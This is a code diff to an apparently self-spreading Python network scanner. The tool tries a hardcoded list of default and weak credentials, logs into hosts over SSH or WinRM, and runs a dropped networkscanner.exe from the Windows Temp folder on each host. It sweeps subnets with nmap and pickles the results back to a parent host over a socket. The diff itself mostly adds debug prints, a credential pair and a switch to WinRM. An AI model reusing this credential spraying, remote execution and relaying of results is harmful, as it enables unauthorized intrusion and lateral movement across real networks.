@@ -26,6 +26,7 @@ creds.append({'user': 'yos', 'pass': 'bos'})
 creds.append({'user': 'kali', 'pass': 'kali'})
 creds.append({'user': 'User', 'pass': 'Matan1245'})
 creds.append({'user': 'Administrator', 'pass': '123456'})
+creds.append({'user': 'dudi', 'pass': '1234'})
 
 father_ip = ''
 options = None
@@ -49,7 +50,7 @@ def get_args():  # TODO: Verify this is positional and must + have help
                         help='relay data back to parent',
                         )
     if debug:
-        options = parser.parse_args(['192.168.2.5', '127.0.0.1', '9000'])
+        options = parser.parse_args(['127.0.0.1', '9000'])
     else:
         options = parser.parse_args()
 
@@ -74,6 +75,7 @@ class Communicator():
         wait = 5
         while fail and limit > 0:
             try:
+                print('starting relay')
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 s.bind(BIND_ADDR)
@@ -82,6 +84,8 @@ class Communicator():
                 t_hi = threading.Thread(target=self.handle_inputs, args=(s,))
                 t_hi.start()
                 fail = False
+                print('relay done')
+                break
             except socket.error as err:
                 print(err)
             limit = limit - wait
@@ -109,7 +113,7 @@ class Communicator():
                 for ip in self.sm_ip:
                     try:
                         s.connect((ip, self.sm_port))
-                        father_ip = ip
+                        print('connected for sending to ', ip)
                         break
                     except TimeoutError:
                         print('not ' + ip)
@@ -117,10 +121,13 @@ class Communicator():
                         print('not ' + ip)
             else:
                 s.connect((self.sm_ip, self.sm_port))
+                print('connected for sending to ', self.sm_ip)
+
             # else:
             #     s.connect((father_ip, self.sm_port))
 
             s.send(pickle.dumps(results))
+            print('data sent!!')
             s.close()
         except socket.error as err:
             print('error:', err)
@@ -279,7 +286,7 @@ class RemoteLogin():
             if self.os == 'linux':
                 self.ssh()
             elif self.os == 'windows':
-                self.windows()
+                self.windows_winrm()
             else:
                 # Guess
                 if self.check_port_open(22):
@@ -366,14 +373,12 @@ class RemoteLogin():
                     print(f'out: {r.std_out}, error: {r.std_err}')
                     time.sleep(1)
 
-                if not father_ip:
-                    if type(local_ips) == list:
-                        ip = ' '.join(local_ips)
-                    else:
-                        ip = local_ips
+                if type(local_ips) == list:
+                    ip = ' '.join(local_ips)
                 else:
-                    ip = father_ip
-                r = s.run_cmd('C:\\Windows\\Temp\\networkscanner.exe -r ' + ip + ' 9000')
+                    ip = local_ips
+
+                r = s.run_cmd('C:\\Windows\\Temp\\networkscanner.exe -r ' + ip + ' 9000 > log.txt')
                 print(f'out: {r.std_out}, error: {r.std_err}')
                 # client = WinClient(self.server, auth=(
                 #     cred['user'], cred['pass']))
@@ -416,22 +421,26 @@ def main():
     debug = False
     local_ips = get_local_ips()
     args = get_args()
+    print(args.parent_ip)
     if not debug:
         communicator = Communicator(args.parent_ip, args.parent_port)
         if args.relay:
             communicator.init_relay()
+        print('done relay')
         nmap_scanner = NmapScanner()
+        print(nmap_scanner)
+        print('done nmap init')
         # Start scanning
         my_data['ips'] = local_ips
         for ip in local_ips:
-            # TODO: in new thread
+            print('starting scan for this leg: ', ip)
             hosts = nmap_scanner.arp_pingsweep(ip)
             nmap_scanner.os_detection(hosts)
     if debug:
         new_hosts = {'192.168.1.46': Host(
             '192.168.1.46')}
         print('debug hosts')
-
+    print('done scanning, sending results')
     # Send results back
     my_data['hosts'] = new_hosts
     if not debug:
